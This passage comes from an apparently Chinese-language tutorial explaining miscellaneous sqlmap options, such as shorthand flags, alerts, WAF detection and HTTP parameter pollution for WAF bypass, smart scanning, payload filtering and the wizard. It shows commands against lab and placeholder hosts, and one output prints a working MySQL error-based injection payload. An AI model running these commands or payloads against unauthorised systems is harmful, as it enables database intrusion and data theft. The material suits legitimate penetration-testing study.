<h3 id="17-保存选项到配置文件中"><a href="#17-保存选项到配置文件中" class="headerlink" title="17.保存选项到配置文件中"></a>17.保存选项到配置文件中</h3><p>参数：–save</p>
<p>使用该参数可以保存Sqlmap命令行参数到配置文件中，该文件可编辑并且可以使用参数“-c”加载。配置文件是INI格式的。</p>
<h3 id="18-升级Sqlmap"><a href="#18-升级Sqlmap" class="headerlink" title="18.升级Sqlmap"></a>18.升级Sqlmap</h3><p>参数：–update</p>
<p>使用此参数可以升级Sqlmap，显然，需要能够连接互联网。万一执行失败，可以在Sqlmap安装目录中执行“git pull”来升级Sqlmap。在Windows中没有git命令可以使用SmartGit之类的git客户端。</p>
<p>实际上“–update”和“git pull”以同样的方式升级Sqlmap，都是从git仓库中获取最新源代码。</p>
<p>强烈建议在报告bug前先升级Sqlmap。</p>
<h2 id="十九、杂项"><a href="#十九、杂项" class="headerlink" title="十九、杂项"></a>十九、杂项</h2><h3 id="1-使用简写"><a href="#1-使用简写" class="headerlink" title="1.使用简写"></a>1.使用简写</h3><p>参数：-z</p>
<p>有些参数组合是被经常用到的，如“–batch –random-agent –ignore-proxy<br>–technique=BEU”，这样写一大串很不好看，在Sqlmap中，提供了一种简写的方式来缩短命令长度。</p>
<p>利用参数“-z”，每个参数都可以只写前几个字母，如“–batch”可以简写为“bat”。简写的原则是能够有所区别、对应的参数唯一就行。各个参数用逗号隔开。如：</p>
<p><code>python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u &quot;www.target.com/vuln.php?id=1&quot;</code></p>
<p>可以简写为：</p>
<p><code>python sqlmap.py -z &quot;bat,randoma,ign,tec=BEU&quot; -u &quot;www.target.com/vuln.php?id=1&quot;</code></p>
<p>再如：</p>
<p><code>python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u &quot;www.target.com/vuln.php?id=1&quot;</code> </p>
<p>可以简写为：</p>
<p><code>python sqlmap.py -z &quot;ign,flu,bat,tec=U,dump,D=testdb,T=users&quot; -u &quot;www.target.com/vuln.php?id=1&quot;</code></p>
<h3 id="2-在成功检测到注入点时报警"><a href="#2-在成功检测到注入点时报警" class="headerlink" title="2.在成功检测到注入点时报警"></a>2.在成功检测到注入点时报警</h3><p>参数：–alert</p>
<p>该参数用于在找到新的注入点时发出警报，后跟一个用于发出警报的命令，如：</p>
<p><code>python sqlmap.py -r data.txt --alert &quot;notify-send &#39;找到漏洞了&#39;&quot;</code></p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[18:59:36] [INFO] GET parameter &apos;couno&apos; appears to be &apos;OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)&apos; injectable (with --not-string=&quot;001&quot;)</span><br><span class="line">[18:59:36] [INFO] executing alerting shell command(s) (&apos;notify-send &apos;找到漏洞了&apos;&apos;)</span><br></pre></td></tr></table></figure>

<p>上例中用于发出警报的命令是Ubuntu中的notify-send命令。</p>
<h3 id="3-设置问题的回答"><a href="#3-设置问题的回答" class="headerlink" title="3.设置问题的回答"></a>3.设置问题的回答</h3><p>参数：–answers</p>
<p>使用“–batch”以非交互模式运行时所有问题都以按默认值作为回答。有时不想以默认值为答案又想使用非交互模式，此时可以使用参数“–answers”对特定问题进行回答，若回答多个问题，以逗号分隔。如：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.22.128/sqlmap/mysql/get_int.php?id=1&quot;--technique=E --answers=&quot;extending=N&quot; --batch</code></p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:56] [INFO] testing for SQL injection on GET parameter &apos;id&apos; heuristic (parsing) test showed that the back-end DBMS could be &apos;MySQL&apos;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span><br><span class="line">[xx:xx:56] [INFO] do you want to include all tests for &apos;MySQL&apos; extending provided level (1) and risk (1)? [Y/n] N</span><br></pre></td></tr></table></figure>

<h3 id="4-在成功检测到注入点时发出“嘟”声"><a href="#4-在成功检测到注入点时发出“嘟”声" class="headerlink" title="4.在成功检测到注入点时发出“嘟”声"></a>4.在成功检测到注入点时发出“嘟”声</h3><p>参数：–beep</p>
<p>使用此参数可以在成功检测到注入点时发出“嘟”声。使用“-m”从日志文件中检测大量网站时该参数会格外有用。</p>
<h3 id="5-清除Sqlmap创建的临时表和自定义函数"><a href="#5-清除Sqlmap创建的临时表和自定义函数" class="headerlink" title="5.清除Sqlmap创建的临时表和自定义函数"></a>5.清除Sqlmap创建的临时表和自定义函数</h3><p>参数：–cleanup</p>
<p>强烈推荐在测试结束后使用此参数清除Sqlmap创建的临时表和自定义函数，Sqlmap会尽可能地清除数据库管理系统和文件系统上的入侵痕迹。</p>
<h3 id="6-检查依赖"><a href="#6-检查依赖" class="headerlink" title="6.检查依赖"></a>6.检查依赖</h3><p>参数：–dependencies</p>
<p>Sqlmap的有些功能依赖第三方库，在用到时发现没有这些库会报错退出。使用此参数可以检查依赖的第三方库是否安装，如：</p>
<p><code>python sqlmap.py --dependencies</code></p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[*] starting at 19:16:05</span><br><span class="line"></span><br><span class="line">[19:16:05] [WARNING] sqlmap requires &apos;python-kinterbasdb&apos; third-party library in order to directly connect to the DBMS &apos;Firebird&apos;. Download from http://kinterbasdb.sourceforge.net/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires &apos;python-pymssql&apos; third-party library in order to directly connect to the DBMS &apos;Sybase&apos;. Download from https://github.com/pymssql/pymssql</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires &apos;python cx_Oracle&apos; third-party library in order to directly connect to the DBMS &apos;Oracle&apos;. Download from http://cx-oracle.sourceforge.net/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires &apos;python-psycopg2&apos; third-party library in order to directly connect to the DBMS &apos;PostgreSQL&apos;. Download from http://initd.org/psycopg/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires &apos;python ibm-db&apos; third-party library in order to directly connect to the DBMS &apos;IBM DB2&apos;. Download from https://github.com/ibmdb/python-ibmdb</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires &apos;python jaydebeapi &amp; python-jpype&apos; third-party library in order to directly connect to the DBMS &apos;HSQLDB&apos;. Download from https://pypi.python.org/pypi/JayDeBeApi/ &amp; http://jpype.sourceforge.net/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires &apos;python ibm-db&apos; third-party library in order to directly connect to the DBMS &apos;Informix&apos;. Download from https://github.com/ibmdb/python-ibmdb</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires &apos;python-pyodbc&apos; third-party library in order to directly connect to the DBMS &apos;Microsoft Access&apos;. Download from https://github.com/mkleehammer/pyodbc</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires &apos;python-pymssql&apos; third-party library in order to directly connect to the DBMS &apos;Microsoft SQL Server&apos;. Download from https://github.com/pymssql/pymssql</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires &apos;python-impacket&apos; third-party library for out-of-band takeover feature. Download from http://code.google.com/p/impacket/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires &apos;python-ntlm&apos; third-party library if you plan to attack a web application behind NTLM authentication. Download from http://code.google.com/p/python-ntlm/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires &apos;websocket-client&apos; third-party library if you plan to attack a web application using WebSocket. Download from https://pypi.python.org/pypi/websocket-client/</span><br><span class="line"></span><br><span class="line">[*] shutting down at 19:16:05</span><br></pre></td></tr></table></figure>

<p>可以看到我缺少的主要是用于连接数据库的第三方库。</p>
<h3 id="7-关闭彩色输出"><a href="#7-关闭彩色输出" class="headerlink" title="7.关闭彩色输出"></a>7.关闭彩色输出</h3><p>参数：–disable-coloring</p>
<h3 id="8-指定使用Google-dork结果的某页"><a href="#8-指定使用Google-dork结果的某页" class="headerlink" title="8.指定使用Google dork结果的某页"></a>8.指定使用Google dork结果的某页</h3><p>参数：–gpage</p>
<p>使用参数“-g”时默认默认选择Google dork结果的前100条做注入测试。结合使用此参数，可以指定使用Google dork结果的某页。</p>
<h3 id="9-使用HTTP参数污染"><a href="#9-使用HTTP参数污染" class="headerlink" title="9.使用HTTP参数污染"></a>9.使用HTTP参数污染</h3><p>参数：–hpp</p>
<p>HTTP参数污染是绕过WAF/IPS/IDS的一种技术，详情见此处。这一技术针对ASP/IIS和ASP.NET/IIS平台尤其有效。如果怀疑目标受WAF/IPS/IDS保护，可以尝试用此参数进行绕过。</p>
<h3 id="10-彻底检测WAF-IPS-IDS"><a href="#10-彻底检测WAF-IPS-IDS" class="headerlink" title="10.彻底检测WAF/IPS/IDS"></a>10.彻底检测WAF/IPS/IDS</h3><p>参数：–identify-waf</p>
<p>Sqlmap可以识别WAF/IPS/IDS以便用户进行针对性操作（如：添加“–tamper”）。目前Sqlmap支持检测30多种不同的WAF/IPS/IDS，如Airlock和Barracuda WAF等。检测WAF的脚本可以在安装目录的waf目录中找到。</p>
<p>下例的目标是MySQL，受ModSecurity WAF保护：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot; --identify-waf -v 3</code></p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:23] [INFO] testing connection to the target URL</span><br><span class="line">[xx:xx:23] [INFO] heuristics detected web page charset &apos;ascii&apos;</span><br><span class="line">[xx:xx:23] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;USP Secure Entry Server (United Security Providers)&apos;[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;BinarySEC Web Application Firewall (BinarySEC)&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;NetContinuum Web Application Firewall (NetContinuum/Barracuda Networks)&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;Hyperguard Web Application Firewall (art of defence Inc.)&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;Cisco ACE XML Gateway (Cisco Systems)&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;TrafficShield (F5 Networks)&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;Teros/Citrix Application Firewall Enterprise (Teros/Citrix Systems)&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;KONA Security Solutions (Akamai Technologies)&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;Incapsula Web Application Firewall (Incapsula/Imperva)&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;CloudFlare Web Application Firewall (CloudFlare)&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;Barracuda Web Application Firewall (Barracuda Networks)&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;webApp.secure (webScurity)&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;Proventia Web Application Security (IBM)&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] declared web page charset &apos;iso-8859-1&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] page not found (404)</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;KS-WAF (Knownsec)&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;NetScaler (Citrix Systems)&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;Jiasule Web Application Firewall (Jiasule)&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;WebKnight Application Firewall (AQTRONIX)&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;AppWall (Radware)&apos;</span><br><span class="line">[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product &apos;ModSecurity: Open Source Web Application Firewall (Trustwave)&apos;</span><br><span class="line">[xx:xx:23] [CRITICAL] WAF/IDS/IPS identified &apos;ModSecurity: Open Source Web Application Firewall (Trustwave)&apos;. Please consider usage of tamper scripts (option &apos;--tamper&apos;)</span><br></pre></td></tr></table></figure>

<p>参数：–skip-waf</p>
<p>默认地Sqlmap会发送虚假的SQL注入playload以试探目标是否有保护措施。如有任何问题，用户可以使用参数“–skip-waf”来禁用这一技术。</p>
<h3 id="11-模仿智能手机"><a href="#11-模仿智能手机" class="headerlink" title="11.模仿智能手机"></a>11.模仿智能手机</h3><p>参数：–mobile</p>
<p>有些网站对智能手机和桌面环境的返回是不同的。当需要测试这种网站的智能手机页面时可以设置一个智能手机的User-Agent，或者更简单地，使用此参数，Sqlmap会在执行时询问要模仿成流行的手机中的哪种，如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; --mobile</span><br><span class="line">[...]</span><br><span class="line">which smartphone do you want sqlmap to imitate through HTTP User-Agent header?</span><br><span class="line">[1] Apple iPhone 4s (default)</span><br><span class="line">[2] BlackBerry 9900</span><br><span class="line">[3] Google Nexus 7</span><br><span class="line">[4] HP iPAQ 6365</span><br><span class="line">[5] HTC Sensation</span><br><span class="line">[6] Nokia N97</span><br><span class="line">[7] Samsung Galaxy S</span><br><span class="line">&gt; 1</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h3 id="12-离线模式（仅仅使用会话数据）"><a href="#12-离线模式（仅仅使用会话数据）" class="headerlink" title="12.离线模式（仅仅使用会话数据）"></a>12.离线模式（仅仅使用会话数据）</h3><p>参数：–offline</p>
<p>添加此参数，Sqlmap将仅仅使用以前存储的会话数据做测试而不向目标发送任何数据包。</p>
<h3 id="13-在Google-dork中展示页面权重"><a href="#13-在Google-dork中展示页面权重" class="headerlink" title="13.在Google dork中展示页面权重"></a>13.在Google dork中展示页面权重</h3><p>参数：–gpage</p>
<p>与参数“-g”一起使用，这会使Sqlmap向Google发起更多的请求并展示页面权重。</p>
<h3 id="14-从输出目录中安全移除所有内容"><a href="#14-从输出目录中安全移除所有内容" class="headerlink" title="14.从输出目录中安全移除所有内容"></a>14.从输出目录中安全移除所有内容</h3><p>参数：–purge</p>
<p>当用户想要安全地删除输出目录中的所有内容时使用此参数。所谓安全删除，不仅仅是删除，而是在删除前先用随机数据覆盖原有数据，甚至对文件名和目录名也进行重命名以覆盖旧名称，所有覆盖工作完成后才执行删除。最后，输出目录中会一无所有。如：</p>
<p><code>python sqlmap.py --purge -v 3</code></p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[*] starting at 19:51:36</span><br><span class="line"></span><br><span class="line">[19:51:36] [DEBUG] cleaning up configuration parameters</span><br><span class="line">[19:51:36] [INFO] purging content of directory &apos;/home/werner/.sqlmap/output&apos;...</span><br><span class="line">[19:51:36] [DEBUG] changing file attributes</span><br><span class="line">[19:51:36] [DEBUG] writing random data to files</span><br><span class="line">[19:51:36] [DEBUG] truncating files</span><br><span class="line">[19:51:36] [DEBUG] renaming filenames to random values</span><br><span class="line">[19:51:36] [DEBUG] renaming directory names to random values</span><br><span class="line">[19:51:36] [DEBUG] deleting the whole directory tree</span><br><span class="line"></span><br><span class="line">[*] shutting down at 19:51:36</span><br></pre></td></tr></table></figure>

<h3 id="15-快速扫描"><a href="#15-快速扫描" class="headerlink" title="15.快速扫描"></a>15.快速扫描</h3><p>参数：–smart</p>
<p>当有大量URL要进行测试（如：“-m”），目的是尽快找出其中存在的某些注入点而有所遗漏也没有关系时可以使用“–smart”进行正向启发式扫描。此时只有让数据库管理系统报错的参数才会做进一步测试，其余URL均被跳过。如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1&quot; --batch --smart</span><br><span class="line">[...]</span><br><span class="line">[xx:xx:14] [INFO] testing if GET parameter &apos;ca&apos; is dynamic</span><br><span class="line">[xx:xx:14] [WARNING] GET parameter &apos;ca&apos; does not appear dynamic</span><br><span class="line">[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter &apos;ca&apos; might not be injectable</span><br><span class="line">[xx:xx:14] [INFO] skipping GET parameter &apos;ca&apos;</span><br><span class="line">[xx:xx:14] [INFO] testing if GET parameter &apos;user&apos; is dynamic</span><br><span class="line">[xx:xx:14] [WARNING] GET parameter &apos;user&apos; does not appear dynamic</span><br><span class="line">[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter &apos;user&apos; might not be injectable</span><br><span class="line">[xx:xx:14] [INFO] skipping GET parameter &apos;user&apos;</span><br><span class="line">[xx:xx:14] [INFO] testing if GET parameter &apos;id&apos; is dynamic</span><br><span class="line">[xx:xx:14] [INFO] confirming that GET parameter &apos;id&apos; is dynamic</span><br><span class="line">[xx:xx:14] [INFO] GET parameter &apos;id&apos; is dynamic</span><br><span class="line">[xx:xx:14] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter &apos;id&apos; might be</span><br><span class="line">injectable (possible DBMS: &apos;MySQL&apos;)</span><br><span class="line">[xx:xx:14] [INFO] testing for SQL injection on GET parameter &apos;id&apos; heuristic (parsing) test showed that the back-end DBMS could be &apos;MySQL&apos;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span><br><span class="line">do you want to include all tests for &apos;MySQL&apos; extending provided level (1) and risk (1)? [Y/n] Y</span><br><span class="line">[xx:xx:14] [INFO] testing &apos;AND boolean-based blind - WHERE or HAVING clause&apos;</span><br><span class="line">[xx:xx:14] [INFO] GET parameter &apos;id&apos; is &apos;AND boolean-based blind - WHERE or HAVING clause&apos; injectable</span><br><span class="line">[xx:xx:14] [INFO] testing &apos;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause&apos;</span><br><span class="line">[xx:xx:14] [INFO] GET parameter &apos;id&apos; is &apos;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause&apos; injectable</span><br><span class="line">[xx:xx:14] [INFO] testing &apos;MySQL inline queries&apos;</span><br><span class="line">[xx:xx:14] [INFO] testing &apos;MySQL &gt; 5.0.11 stacked queries&apos;</span><br><span class="line">[xx:xx:14] [INFO] testing &apos;MySQL &lt; 5.0.12 stacked queries (heavy query)&apos;</span><br><span class="line">[xx:xx:14] [INFO] testing &apos;MySQL &gt; 5.0.11 AND time-based blind&apos;</span><br><span class="line">[xx:xx:24] [INFO] GET parameter &apos;id&apos; is &apos;MySQL &gt; 5.0.11 AND time-based blind&apos; injectable</span><br><span class="line">[xx:xx:24] [INFO] testing &apos;MySQL UNION query (NULL) - 1 to 20 columns&apos;</span><br><span class="line">[xx:xx:24] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other potential injection technique found</span><br><span class="line">[xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the</span><br><span class="line">time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test</span><br><span class="line">[xx:xx:24] [INFO] target URL appears to have 3 columns in query</span><br><span class="line">[xx:xx:24] [INFO] GET parameter &apos;id&apos; is &apos;MySQL UNION query (NULL) - 1 to 20 columns&apos; injectable</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h3 id="16-通过关键词使用或跳过payload"><a href="#16-通过关键词使用或跳过payload" class="headerlink" title="16.通过关键词使用或跳过payload"></a>16.通过关键词使用或跳过payload</h3><p>参数：–test-filter</p>
<p>若只想使用包含关键词“ROW”的payload可使用参数“–test-filter=ROW”。下面是以Mysql为目标的例子：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot; --batch --test-filter=ROW</code></p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:39] [INFO] GET parameter ’id’ is dynamic</span><br><span class="line">[xx:xx:39] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[xx:xx:39] [INFO] heuristic (basic) test shows that GET parameter ’id’ might be injectable (possible DBMS: ’MySQL’)</span><br><span class="line">[xx:xx:39] [INFO] testing for SQL injection on GET parameter ’id’</span><br><span class="line">[xx:xx:39] [INFO] testing ’MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause’</span><br><span class="line">[xx:xx:39] [INFO] GET parameter ’id’ is ’MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause’ injectable GET parameter ’id’ is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span><br><span class="line">sqlmap identified the following injection points with a total of 3 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Place: GET</span><br><span class="line">Parameter: id</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause</span><br><span class="line">    Payload: id=1 AND ROW(4959,4971)&gt;(SELECT COUNT(*),CONCAT(0x3a6d70623a,(SELECT (CASE WHEN (4959=4959) THEN 1 ELSE 0 END)),0x3a6b7a653a,FLOOR(RAND(0)*2))x FROM (SELECT 4706 UNION SELECT 3536 UNION SELECT 7442 UNION SELECT 3470)a GROUP BY x)</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p>参数：–test-skip</p>
<p>若不想使用包含关键词“BENCHMARK”的payload可使用参数“–test-skip=BENCHMARK”。</p>
<h3 id="17-交互式Sqlmap-Shell"><a href="#17-交互式Sqlmap-Shell" class="headerlink" title="17.交互式Sqlmap Shell"></a>17.交互式Sqlmap Shell</h3><p>参数：–sqlmap-shell</p>
<p>使用此参数可以打开一个交互式的Sqlmap Shell，支持历史记录。如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">werner@Yasser:~$ sqlmap --sqlmap-shell</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.1.10#stable&#125;</span><br><span class="line">|_ -| . [&quot;]     | .&apos;| . |</span><br><span class="line">|___|_  [(]_|_|_|__,|  _|</span><br><span class="line">      |_|V          |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">sqlmap-shell&gt; -u &quot;192.168.56.102&quot;</span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting at 20:22:46</span><br><span class="line"></span><br><span class="line">[20:22:46] [INFO] testing connection to the target URL</span><br><span class="line">[20:22:46] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS</span><br><span class="line">[20:22:46] [INFO] testing if the target URL is stable</span><br><span class="line">[20:22:47] [INFO] target URL is stable</span><br><span class="line">[20:22:47] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter &apos;id&apos; in &apos;www.site.com/index.php?id=1&apos;)</span><br><span class="line"></span><br><span class="line">[*] shutting down at 20:22:47</span><br><span class="line"></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.1.10#stable&#125;</span><br><span class="line">|_ -| . [&quot;]     | .&apos;| . |</span><br><span class="line">|___|_  [(]_|_|_|__,|  _|</span><br><span class="line">      |_|V          |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">sqlmap-shell&gt; exit</span><br></pre></td></tr></table></figure>

<h3 id="18-为初学者准备的简单向导"><a href="#18-为初学者准备的简单向导" class="headerlink" title="18.为初学者准备的简单向导"></a>18.为初学者准备的简单向导</h3><p>参数：–wizard</p>
<p>Sqlmap特地为初学者准备了一个有着尽可能少问题的工作流的向导。用户输入目标后若一直按回车选择默认回答到工作流的最后也会得到一个正确的结果。如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">werner@Yasser:~$ sqlmap --wizard</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[&quot;]_____ ___ ___  &#123;1.1.10#stable&#125;</span><br><span class="line">|_ -| . [)]     | .&apos;| . |</span><br><span class="line">|___|_  [&quot;]_|_|_|__,|  _|</span><br><span class="line">      |_|V          |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting at 20:39:41</span><br><span class="line"></span><br><span class="line">[20:39:41] [INFO] starting wizard interface</span><br><span class="line">Please enter full target URL (-u): http://192.168.56.102/login.php</span><br><span class="line">POST data (--data) [Enter for None]: username=001&amp;password=003</span><br><span class="line">Injection difficulty (--level/--risk). Please choose:</span><br><span class="line">[1] Normal (default)</span><br><span class="line">[2] Medium</span><br><span class="line">[3] 